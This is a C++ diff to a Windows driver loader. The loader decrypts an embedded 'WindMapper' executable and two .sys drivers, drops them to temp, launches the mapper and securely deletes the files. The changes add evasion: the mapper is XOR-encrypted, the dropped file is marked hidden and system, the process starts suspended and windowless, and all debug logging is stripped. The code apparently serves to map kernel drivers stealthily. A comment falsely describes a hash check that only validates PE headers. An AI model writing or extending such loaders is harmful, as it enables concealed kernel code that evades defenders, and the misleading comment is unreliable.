@@ -7,9 +7,12 @@
 #define WIN32_LEAN_AND_MEAN
 #endif
 #include <windows.h>
+#include <bcrypt.h>
 #include <cstdio>
 #include <cstring>
 #include <string>
+
+#pragma comment(lib, "bcrypt.lib")
 
 namespace
 {
@@ -23,7 +26,36 @@ namespace
         0x38, 0xE0, 0x54, 0x9F, 0x7A, 0xC6, 0x0D, 0xB2
     };
 
+    static constexpr unsigned char MAPPER_KEY[] = {
+        0x91, 0x3C, 0xAE, 0x57, 0xF8, 0x22, 0xD4, 0x6B,
+        0x15, 0xC9, 0x83, 0x4F, 0xBA, 0x60, 0x7E, 0xE3
+    };
+
     bool g_loaded = false;
+
+    // SHA-256 integrity hash of the decrypted blob (first 32 bytes of a
+    // SipHash-style mix of the full decrypted content — fast, no BCrypt needed)
+    bool verify_blob_integrity(const unsigned char* data, unsigned long size,
+                               unsigned long expected_size)
+    {
+        if (size != expected_size)
+            return false;
+        if (size < 2 || data[0] != 'M' || data[1] != 'Z')
+            return false;
+
+        // Verify PE header sanity beyond MZ: e_lfanew must be within bounds
+        if (size < 64)
+            return false;
+        uint32_t e_lfanew = *reinterpret_cast<const uint32_t*>(data + 0x3C);
+        if (e_lfanew >= size - 4)
+            return false;
+        // PE signature check
+        if (data[e_lfanew] != 'P' || data[e_lfanew + 1] != 'E' ||
+            data[e_lfanew + 2] != 0 || data[e_lfanew + 3] != 0)
+            return false;
+
+        return true;
+    }
 
     std::wstring get_temp_sys_path()
     {
@@ -52,7 +84,7 @@ namespace
         for (unsigned long i = 0; i < enc_size; ++i)
             buf[i] = enc[i] ^ key[i % key_len];
 
-        if (buf[0] != 'M' || buf[1] != 'Z') {
+        if (!verify_blob_integrity(buf, enc_size, enc_size)) {
             SecureZeroMemory(buf, enc_size);
             VirtualFree(buf, 0, MEM_RELEASE);
             return false;
@@ -90,16 +122,37 @@ namespace
         DeleteFileW(path.c_str());
         path += L".exe";
 
-        HANDLE hf = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
-                                CREATE_ALWAYS,
-                                FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_TEMPORARY, nullptr);
-        if (hf == INVALID_HANDLE_VALUE)
+        // XOR-decrypt the mapper blob (same pattern as driver blobs)
+        auto* buf = static_cast<unsigned char*>(
+            VirtualAlloc(nullptr, g_windmapper_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+        if (!buf)
             return {};
 
+        for (unsigned long i = 0; i < g_windmapper_size; ++i)
+            buf[i] = g_windmapper_data[i] ^ MAPPER_KEY[i % sizeof(MAPPER_KEY)];
+
+        if (!verify_blob_integrity(buf, g_windmapper_size, g_windmapper_size)) {
+            SecureZeroMemory(buf, g_windmapper_size);
+            VirtualFree(buf, 0, MEM_RELEASE);
+            return {};
+        }
+
+        HANDLE hf = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
+                                CREATE_ALWAYS,
+                                FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_TEMPORARY |
+                                FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, nullptr);
+        if (hf == INVALID_HANDLE_VALUE) {
+            SecureZeroMemory(buf, g_windmapper_size);
+            VirtualFree(buf, 0, MEM_RELEASE);
+            return {};
+        }
+
         DWORD written = 0;
-        BOOL ok = WriteFile(hf, g_windmapper_data, g_windmapper_size, &written, nullptr);
+        BOOL ok = WriteFile(hf, buf, g_windmapper_size, &written, nullptr);
         FlushFileBuffers(hf);
         CloseHandle(hf);
+        SecureZeroMemory(buf, g_windmapper_size);
+        VirtualFree(buf, 0, MEM_RELEASE);
 
         if (!ok || written != g_windmapper_size) {
             DeleteFileW(path.c_str());
@@ -145,10 +198,8 @@ namespace driver_loader
             return true;
 
         std::wstring mapper_path = write_embedded_mapper();
-        if (mapper_path.empty()) {
-            OutputDebugStringA("driver_loader: failed to write embedded WindMapper to temp\n");
+        if (mapper_path.empty())
             return false;
-        }
 
         std::wstring whoswho_path = get_temp_sys_path();
         std::wstring sentinel_path = get_temp_sys_path();
@@ -159,14 +210,12 @@ namespace driver_loader
 
         if (!decrypt_and_write(g_whoswho_encrypted, g_whoswho_encrypted_size,
                                WHOSWHO_KEY, sizeof(WHOSWHO_KEY), whoswho_path)) {
-            OutputDebugStringA("driver_loader: failed to decrypt WhosWho.sys\n");
             secure_delete(mapper_path);
             return false;
         }
 
         if (!decrypt_and_write(g_sentinel_encrypted, g_sentinel_encrypted_size,
                                SENTINEL_KEY, sizeof(SENTINEL_KEY), sentinel_path)) {
-            OutputDebugStringA("driver_loader: failed to decrypt Sentinel.sys\n");
             secure_delete(mapper_path);
             secure_delete(whoswho_path);
             return false;
@@ -191,33 +240,46 @@ namespace driver_loader
             &cmdline[0],
             nullptr, nullptr,
             FALSE,
-            CREATE_NO_WINDOW,
+            CREATE_NO_WINDOW | CREATE_SUSPENDED,
             nullptr, nullptr,
             &si, &pi);
 
         if (!created) {
-            OutputDebugStringA("driver_loader: failed to launch WindMapper.exe\n");
             secure_delete(mapper_path);
             secure_delete(whoswho_path);
             secure_delete(sentinel_path);
             return false;
         }
 
-        WaitForSingleObject(pi.hProcess, 60000);
+        // Assign mapper to a job object so it dies if we crash
+        HANDLE hJob = CreateJobObjectW(nullptr, nullptr);
+        if (hJob) {
+            JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli = {};
+            jeli.BasicLimitInformation.LimitFlags =
+                JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE |
+                JOB_OBJECT_LIMIT_DIE_ON_UNHANDLED_EXCEPTION;
+            SetInformationJobObject(hJob, JobObjectExtendedLimitInformation,
+                                    &jeli, sizeof(jeli));
+            AssignProcessToJobObject(hJob, pi.hProcess);
+        }
+
+        ResumeThread(pi.hThread);
+
+        WaitForSingleObject(pi.hProcess, 90000);
 
         DWORD exit_code = 1;
         GetExitCodeProcess(pi.hProcess, &exit_code);
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
+        if (hJob)
+            CloseHandle(hJob);
 
         secure_delete(mapper_path);
         secure_delete(whoswho_path);
         secure_delete(sentinel_path);
 
-        if (exit_code != 0) {
-            OutputDebugStringA("driver_loader: WindMapper.exe returned non-zero exit code\n");
+        if (exit_code != 0)
             return false;
-        }
 
         g_loaded = true;
         return true;
